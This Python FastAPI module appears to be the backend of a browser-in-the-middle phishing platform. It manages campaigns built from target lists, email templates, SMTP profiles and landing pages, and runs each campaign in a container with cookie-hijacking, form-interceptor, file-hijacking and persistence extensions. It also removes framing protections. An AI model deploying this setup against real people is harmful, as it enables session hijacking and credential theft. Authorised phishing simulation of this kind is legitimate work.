"""Campaign creation, lookup, lifecycle, and runtime-state routes."""

from __future__ import annotations

from .campaign_common import (
    APIRouter,
    CAMPAIGN_IMAGE,
    Campaign,
    CampaignCreateRequest,
    CampaignRuntimeStateError,
    CampaignStatus,
    DOCKER_NETWORK,
    Depends,
    ENVIRONMENT,
    EmailTemplate,
    HTTPException,
    INTERNAL_API_KEY,
    LandingPage,
    MODE,
    Module,
    Path,
    Plugin,
    PluginFileValidationError,
    SMTPProfile,
    STORAGE_PATH,
    Session,
    Target,
    TargetList,
    User,
    Victim,
    asyncio,
    build_campaign_public_url,
    connect_container_to_campaign_network,
    copy_file_to_container,
    create_campaign_egress_proxy,
    create_campaign_victims,
    datetime,
    derive_campaign_api_key,
    derive_entry_path,
    find_free_port,
    get_current_user_from_session,
    get_db,
    get_docker_client,
    get_host_campaign_storage_path,
    get_selkies_env,
    json,
    logger,
    normalize_public_domain,
    os,
    process_landing_page,
    remove_campaign_runtime,
    require_campaign_read_access,
    require_campaign_write_access,
    require_operator,
    resolve_campaign_schedule,
    resolve_plugin_destination,
    secrets,
    set_campaign_runtime_paused,
    setup_campaign_storage,
    status,
    tempfile,
    timezone,
    uuid,
    valid_url,
    validate_plugin_files,
)
from utils.campaign_domains import find_public_domain_conflict
from utils.runtime_identity import runtime_identity_environment

router = APIRouter()


@router.post("", status_code=status.HTTP_201_CREATED)
async def create_campaign(
    request: CampaignCreateRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_operator)
):
    """Create new campaign and persist to DB"""
    data = request.model_dump()

    name = data["name"]
    url = data["url"]
    public_domain = data.get("public_domain")

    mode = MODE
    advanced_options = data.get("advanced_options") or {}
    route_config = {
        "entry_path": derive_entry_path(url),
        "stream_path": secrets.token_urlsafe(6),
        "tracking_parameter": advanced_options.get("tracking_parameter"),
    }
    advanced_options["routes"] = route_config

    campaign_type = data["campaign_type"]

    # ✅ Email campaign fields
    target_list_id = data.get("target_list_id")
    email_template_id = data.get("email_template_id")
    sending_profile_id = data.get("smtp_profile_id")
    landing_page_id = data.get("landing_page_id")
    plugin_ids = data.get("plugin_ids") or []
    module_ids = data.get("module_ids") or []

    campaign_id = str(uuid.uuid4())[:8]

    now = datetime.now(timezone.utc)
    scheduled_start, scheduled_end, campaign_status = (
        resolve_campaign_schedule(data, campaign_type, now)
    )

    if campaign_type == "full" and not email_template_id:
        raise HTTPException(400, "email_template_id required")

    if campaign_type == "full" and not sending_profile_id:
        raise HTTPException(400, "smtp_profile_id required")

    if not valid_url(url):
        raise HTTPException(400, "invalid url")

    campaign_host = normalize_public_domain(public_domain)
    public_url = build_campaign_public_url(campaign_id, campaign_host)

    # Check if campaign with same name exists
    existing = db.query(Campaign).filter(
        Campaign.name == name,
        Campaign.deleted_at == None
    ).first()

    if existing:
        raise HTTPException(400, f"Campaign with name '{name}' already exists")

    if ENVIRONMENT == "production":
        host_conflict = find_public_domain_conflict(
            db,
            public_url,
            scheduled_start=scheduled_start,
            scheduled_end=scheduled_end,
        )
        if host_conflict:
            raise HTTPException(
                409,
                f"Public domain '{campaign_host}' is already used or reserved by "
                f"campaign '{host_conflict.name}'",
            )

    # Verify email template exists
    if campaign_type == "full":
        email_template = db.query(EmailTemplate).filter(EmailTemplate.id == email_template_id).first()
        if not email_template:
            raise HTTPException(404, "email_template not found")

        # Verify SMTP profile exists
        smtp_profile = db.query(SMTPProfile).filter(SMTPProfile.id == sending_profile_id).first()
        if not smtp_profile:
            raise HTTPException(404, "smtp_profile not found")

    target_list = db.query(Target).filter(Target.target_list_id == target_list_id).all()
    if not target_list:
        raise HTTPException(404, "target_list not found or empty")

    target_list_row = db.query(TargetList).filter(TargetList.id == target_list_id).first()

    landing_page = db.query(LandingPage).filter(LandingPage.id == landing_page_id).first()
    if not landing_page:
        raise HTTPException(404, "landing_page not found")

    processed_html = process_landing_page(
        html_content=landing_page.content,
        campaign_id=campaign_id
    )

    # Generate config
    ip = os.environ.get("IP", "127.0.0.1")

    try:
        port = find_free_port()
    except RuntimeError:
        raise HTTPException(500, "no free port available")

    container_name = f"p-bitm-{campaign_id}"

    extensions = [
        "file-hijacking",
        "persistence",
        "site-info-hijacking",
        "disable-shortcuts",
        "form-interceptor",
        "cookie-hijacking"
    ]

    plugins = db.query(Plugin).filter(Plugin.id.in_(plugin_ids)).all()
    validated_plugin_files = {}
    for plugin in plugins:
        try:
            validated_plugin_files[plugin.id] = validate_plugin_files(
                plugin.files or []
            )
        except (json.JSONDecodeError, PluginFileValidationError) as exc:
            raise HTTPException(
                400,
                f"Plugin '{plugin.name}' contains invalid file data",
            ) from exc

    for plugin in plugins:
        if plugin.name not in extensions:
            extensions.append(f"plugin-{plugin.id}")

    # Storage path
    storage_path = setup_campaign_storage(name, campaign_id)
    host_storage_path = str(get_host_campaign_storage_path(name, campaign_id))

    plugin_storage_path = Path(storage_path) / "plugins"
    plugin_storage_path.mkdir(parents=True, exist_ok=True)
    for plugin in plugins:
        try:
            plugin_dir = resolve_plugin_destination(
                plugin_storage_path,
                f"plugin-{plugin.id}",
            )
            plugin_dir.mkdir(parents=True, exist_ok=True)
            for file in validated_plugin_files[plugin.id]:
                destination = resolve_plugin_destination(plugin_dir, file["name"])
                destination.parent.mkdir(parents=True, exist_ok=True)
                with open(destination, 'w', encoding='utf-8') as f:
                    content = file["content"]
                    f.write(content)
        except PluginFileValidationError as e:
            logger.error(f"❌ Unsafe plugin file path for {plugin.name}: {e}")
            raise HTTPException(400, f"Plugin '{plugin.name}' contains an unsafe path")
        except Exception as exc:
            logger.exception("Failed to create XPI for plugin %s", plugin.name)
            raise HTTPException(
                500,
                "Failed to create plugin XPI",
            ) from exc

    # Selkies config
    default_selkies = {
        "use_streaming_mode": True,
        "use_paint_over_quality": True,
        "video_quality": "medium",
        "framerate": "medium",
        "compression_level": "medium"
    }

    campaign_protocol = advanced_options.get("protocol", "selkies")
    selkies_config = advanced_options.get("selkies", default_selkies)
    selkies_env = get_selkies_env({"selkies": selkies_config})

    # Save modules to campaign storage.
    modules = db.query(Module).filter(Module.id.in_(module_ids)).all()

    if modules:
        modules_storage_path = Path(storage_path) / "modules"
        modules_storage_path.mkdir(parents=True, exist_ok=True)

        for module in modules:
            module_filename = f"{module.id}.json"
            module_dest = modules_storage_path / module_filename

            # Save module as JSON
            with open(module_dest, 'w', encoding='utf-8') as f:
                json.dump(module.to_dict(), f, indent=2)

            logger.info(f"✅ Saved module {module.name} to {module_dest}")

    env = {
        "ENVIRONMENT": ENVIRONMENT,
        "CAMPAIGN_ID": campaign_id,
        "CAMPAIGN_HOST": campaign_host,
        "CAMPAIGN_PROTOCOL": campaign_protocol,
        "ENTRY_PATH": route_config["entry_path"],
        "TRACKING_PARAMETER": route_config["tracking_parameter"] or "",
        "STREAM_PATH": route_config["stream_path"],
        "LANDING_COOKIE_NAME": f"session_{secrets.token_hex(6)}",
        "STREAM_COOKIE_NAME": f"media_{secrets.token_hex(6)}",
        "CONTAINER_NAME": container_name,
        "IP": ip,
        "PORT": str(port),
        "MODE": mode,
        "URL": url,
        "EXTENSIONS": ",".join(extensions),
        "INTERNAL_API_KEY": derive_campaign_api_key(INTERNAL_API_KEY, campaign_id),
        "SESSION_TOKEN_SECRET": secrets.token_urlsafe(32),
        "GATEWAY_AUTH_KEY": secrets.token_hex(32),
        "SESSION_TOKEN_TTL_SECONDS": os.getenv("SESSION_TOKEN_TTL_SECONDS", "300"),
        "STREAM_ACCESS_TTL_SECONDS": os.getenv(
            "STREAM_ACCESS_TTL_SECONDS",
            "86400",
        ),
        "WS_HANDSHAKE_TIMEOUT_SECONDS": os.getenv("WS_HANDSHAKE_TIMEOUT_SECONDS", "10"),
        "WS_SESSION_STARTUP_TIMEOUT_SECONDS": os.getenv(
            "WS_SESSION_STARTUP_TIMEOUT_SECONDS", "45"
        ),
        "MAX_ACTIVE_SESSIONS": os.getenv("MAX_ACTIVE_SESSIONS", "20"),
        "WS_RATE_LIMIT_WINDOW_SECONDS": os.getenv(
            "WS_RATE_LIMIT_WINDOW_SECONDS", "60"
        ),
        "WS_RATE_LIMIT_MAX_ATTEMPTS": os.getenv(
            "WS_RATE_LIMIT_MAX_ATTEMPTS", "10"
        ),
        "WS_GLOBAL_RATE_LIMIT_MAX_ATTEMPTS": os.getenv(
            "WS_GLOBAL_RATE_LIMIT_MAX_ATTEMPTS", "200"
        ),
        "STORAGE_PATH": STORAGE_PATH,
        "HOST_STORAGE_PATH": host_storage_path,
        "ADMIN_API_URL": f"http://bitm-backend:8443",
        **runtime_identity_environment(),
    }

    # Create Docker container
    container = None
    try:
        stream_router = f"{campaign_id}-stream"
        router_labels = {
            f"traefik.http.routers.{campaign_id}.entrypoints": "websecure",
            f"traefik.http.routers.{campaign_id}.tls": "true",
            f"traefik.http.routers.{campaign_id}.priority": "50",
            f"traefik.http.routers.{campaign_id}.service": f"{campaign_id}",
            f"traefik.http.routers.{campaign_id}.middlewares": f"{campaign_id}-frame",
            f"traefik.http.middlewares.{campaign_id}-frame.headers.customResponseHeaders.X-Frame-Options": "",
            f"traefik.http.middlewares.{campaign_id}-frame.headers.contentSecurityPolicy": (
                "frame-ancestors *"
            ),
            f"traefik.http.routers.{stream_router}.entrypoints": "websecure",
            f"traefik.http.routers.{stream_router}.tls": "true",
            f"traefik.http.routers.{stream_router}.priority": "100",
            f"traefik.http.routers.{stream_router}.service": campaign_id,
            f"traefik.http.routers.{stream_router}.middlewares": (
                f"{campaign_id}-stream-frame"
            ),
            f"traefik.http.middlewares.{campaign_id}-stream-frame.headers.customResponseHeaders.X-Frame-Options": "",
            f"traefik.http.middlewares.{campaign_id}-stream-frame.headers.contentSecurityPolicy": (
                "frame-ancestors *"
            ),
        }

        if ENVIRONMENT == "production":
            router_labels.update({
                f"traefik.http.routers.{campaign_id}.rule": f"Host(`{campaign_host}`)",
                f"traefik.http.routers.{campaign_id}.tls.certresolver": "letsencrypt",
                f"traefik.http.routers.{stream_router}.rule": (
                    f"Host(`{campaign_host}`) && "
                    f"PathPrefix(`/{route_config['stream_path']}/`)"
                ),
                f"traefik.http.routers.{stream_router}.tls.certresolver": "letsencrypt",
            })
        else:
            router_labels.update({
                f"traefik.http.routers.{campaign_id}.rule": f'PathPrefix("/{campaign_id}")',
                f"traefik.http.routers.{campaign_id}.middlewares": (
                    f"{campaign_id}-strip,{campaign_id}-frame"
                ),
                f"traefik.http.middlewares.{campaign_id}-strip.stripprefix.prefixes": f"/{campaign_id}",
                f"traefik.http.routers.{stream_router}.rule": (
                    f"PathPrefix(`/{campaign_id}/{route_config['stream_path']}/`)"
                ),
                f"traefik.http.routers.{stream_router}.middlewares": (
                    f"{campaign_id}-strip,{campaign_id}-stream-frame"
                ),
            })

        container = get_docker_client().containers.create(
            CAMPAIGN_IMAGE,
            detach=True,
            name=container_name,
            labels={
                "bitm.campaign.id": campaign_id,
                "bitm.campaign.name": name,
                "bitm.type": "campaign",
                "traefik.enable": "true",
                # Traefik must enter through the campaign gateway. FastAPI on
                # 8443 remains an implementation detail behind nginx.
                f"traefik.http.services.{campaign_id}.loadbalancer.server.port": "8081",
                f"traefik.http.services.{campaign_id}.loadbalancer.server.scheme": "http",
                "traefik.docker.network": DOCKER_NETWORK,
                **router_labels,
            },
            environment={
                **env,
                **(selkies_env if campaign_protocol == "selkies" else {})
            },
            volumes={
                host_storage_path: {"bind": "/storage", "mode": "rw"}
            },
            network=DOCKER_NETWORK,
            mem_limit="4g",
            memswap_limit="4g",
            nano_cpus=2_000_000_000,
            pids_limit=512,
            cap_drop=["ALL"],
            security_opt=["no-new-privileges:true"],
            auto_remove=False
        )
        connect_container_to_campaign_network(container, campaign_id)
        create_campaign_egress_proxy(
            campaign_id,
            start=campaign_status == CampaignStatus.active,
        )

        logger.info(f"✅ Created container: {container_name}")

    except Exception as exc:
        logger.exception("Failed to create campaign runtime")
        try:
            remove_campaign_runtime(container_name, campaign_id)
        except Exception:
            logger.exception("Failed to roll back campaign runtime")
        raise HTTPException(500, "Campaign runtime creation failed") from exc

    try:
        # Copy landing page
        temp_file_path = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="w",
                suffix=".html",
                delete=False,
                encoding="utf-8",
            ) as temporary_landing:
                temporary_landing.write(processed_html)
                temp_file_path = temporary_landing.name
            copy_file_to_container(
                container.id,
                temp_file_path,
                "/app/templates/landing_page.html",
            )
            logger.info("✅ Copied landing page to container")
        finally:
            if temp_file_path:
                Path(temp_file_path).unlink(missing_ok=True)

    except Exception as exc:
        logger.exception("Failed to copy campaign assets")
        try:
            remove_campaign_runtime(container_name, campaign_id)
        except Exception:
            logger.exception("Failed to roll back campaign runtime")
        raise HTTPException(500, "Failed to provision campaign assets") from exc
    if campaign_status == CampaignStatus.active:
        try:
            container.start()
        except Exception:
            logger.exception("Campaign container failed to start")
            try:
                remove_campaign_runtime(container_name, campaign_id)
            except Exception:
                logger.exception("Failed to roll back campaign runtime")
            raise HTTPException(500, "Campaign container failed to start")

    campaign = Campaign(
        id=campaign_id,
        name=name,
        description=data.get("description"),
        campaign_type=campaign_type,
        target_url=url,
        mode=mode,
        protocol=campaign_protocol,
        container_id=container.id,
        container_name=container_name,
        container_status=(
            "running"
            if campaign_status == CampaignStatus.active
            else "scheduled"
        ),
        host_ip=ip,
        host_port=port,
        public_url=public_url,
        plugin_ids=extensions,
        module_ids=module_ids,
        selkies_config=selkies_config,
        advanced_options=advanced_options,
        status=campaign_status,
        target_list_id=target_list_id,
        email_template_id=email_template_id,
        sending_profile_id=sending_profile_id,
        landing_page_id=landing_page_id,
        scheduled_start=scheduled_start,
        scheduled_end=scheduled_end,
        started_at=now if campaign_status == CampaignStatus.active else None,
        created_by=current_user.id,
        created_at=datetime.now(timezone.utc),
    )

    try:
        db.add(campaign)
        victims_created = create_campaign_victims(
            db=db,
            campaign_id=campaign_id,
            targets=target_list,
            scheduled_date=scheduled_start,
            scheduled_date_end=scheduled_end,
            company=target_list_row.company if target_list_row else None,
        )
        if target_list_row:
            target_list_row.usage_count += 1
            target_list_row.last_used_at = now
        db.commit()
        db.refresh(campaign)
    except Exception:
        db.rollback()
        logger.exception("Failed to persist campaign and victims")
        try:
            remove_campaign_runtime(container_name, campaign_id)
        except Exception:
            logger.exception("Failed to roll back campaign runtime")
        raise HTTPException(
            500,
            "Failed to persist campaign and victims",
        )

    logger.info(
        "Campaign created: %s with %s victim(s) (by %s)",
        name,
        victims_created,
        current_user.username,
    )
    return {
        **campaign.to_dict(),
        "victims_count": victims_created
    }


@router.get("")
async def get_campaigns(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user_from_session)
):
    """Get all active campaigns"""
    query = db.query(Campaign).filter(Campaign.deleted_at == None)
    if not current_user.is_admin():
        query = query.filter(Campaign.created_by == current_user.id)
    campaigns = query.all()

    for c in campaigns:
        c.update_stats(db)

    return [c.to_dict() for c in campaigns]


@router.get("/{campaign_id}")
async def get_campaign(
    campaign_id: str,
    include_victims: bool = False,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get single campaign with optional victims"""
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    campaign.update_stats(db)
    return campaign.to_dict(include_victims=include_victims)


@router.post("/{campaign_id}/stop")
async def stop_campaign(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Stop a running campaign"""
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    try:
        remove_campaign_runtime(campaign.container_name, campaign_id)
    except Exception as exc:
        logger.exception("Failed to stop campaign runtime %s", campaign_id)
        raise HTTPException(500, "Campaign runtime could not be stopped") from exc

    campaign.status = CampaignStatus.completed
    campaign.container_status = "stopped"
    campaign.completed_at = datetime.now(timezone.utc)

    victims = db.query(Victim).filter(
        Victim.campaign_id == campaign_id
    ).all()
    for victim in victims:
        victim.is_active = False
        victim.container_status = "stopped"

    db.commit()
    db.refresh(campaign)

    logger.info(
        "Campaign stopped: %s (by %s)", campaign.name, current_user.username
    )

    return {"success": True, "message": "Campaign stopped successfully"}


@router.delete("/{campaign_id}")
async def delete_campaign(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Soft delete campaign and stop container"""
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    # Stop and remove Docker container
    try:
        remove_campaign_runtime(campaign.container_name, campaign_id)
        logger.info(f"✅ Removed campaign runtime: {campaign.container_name}")
    except Exception as e:
        logger.error(f"❌ Error removing container: {e}")
        raise HTTPException(500, "Campaign runtime could not be removed") from e

    # Soft delete
    campaign.deleted_at = datetime.now(timezone.utc)
    campaign.status = CampaignStatus.completed
    campaign.container_status = "stopped"

    db.commit()

    logger.info(
        "Campaign deleted: %s (by %s)", campaign.name, current_user.username
    )
    return {"status": "deleted", "id": campaign_id}


@router.post("/{campaign_id}/pause")
async def pause_campaign(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Pause active campaign"""
    campaign = db.query(Campaign).filter_by(id=campaign_id).first()

    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")

    if campaign.status != CampaignStatus.active:
        raise HTTPException(status_code=400, detail="Campaign is not active")

    campaign.status = CampaignStatus.paused
    campaign.container_status = "pausing"
    db.commit()

    try:
        await asyncio.to_thread(
            set_campaign_runtime_paused,
            campaign.container_name,
            campaign.id,
            True,
        )
    except CampaignRuntimeStateError as exc:
        db.rollback()
        campaign = db.query(Campaign).filter_by(id=campaign_id).first()
        campaign.status = CampaignStatus.active
        campaign.container_status = "running"
        db.commit()
        logger.warning(
            "Failed to pause campaign %s, rolled back to active: %s",
            campaign_id,
            exc,
        )
        raise HTTPException(
            status_code=503,
            detail="Campaign runtime could not be paused",
        ) from exc

    campaign.container_status = "paused"
    db.commit()

    logger.info(
        "Campaign paused: %s (by %s)", campaign.name, current_user.username
    )

    return {"message": "Campaign paused", "status": campaign.status.value}


@router.post("/{campaign_id}/resume")
async def resume_campaign(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access)
):
    """Resume paused campaign"""
    campaign = db.query(Campaign).filter_by(id=campaign_id).first()

    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")

    if campaign.status != CampaignStatus.paused:
        raise HTTPException(status_code=400, detail="Campaign is not paused")

    now = datetime.now(timezone.utc)
    campaign.container_status = "resuming"
    db.commit()

    try:
        await asyncio.to_thread(
            set_campaign_runtime_paused,
            campaign.container_name,
            campaign.id,
            False,
        )
    except CampaignRuntimeStateError as exc:
        db.rollback()
        campaign = db.query(Campaign).filter_by(id=campaign_id).first()
        campaign.status = CampaignStatus.paused
        campaign.container_status = "paused"
        db.commit()
        logger.warning(
            "Failed to resume campaign %s, rolled back to paused: %s",
            campaign_id,
            exc,
        )
        raise HTTPException(
            status_code=503,
            detail="Campaign runtime could not be resumed",
        ) from exc

    campaign.status = CampaignStatus.active
    campaign.container_status = "running"
    if campaign.started_at is None:
        campaign.started_at = now
    db.commit()

    logger.info(
        "Campaign resumed: %s (by %s)", campaign.name, current_user.username
    )

    return {"message": "Campaign resumed", "status": campaign.status.value}
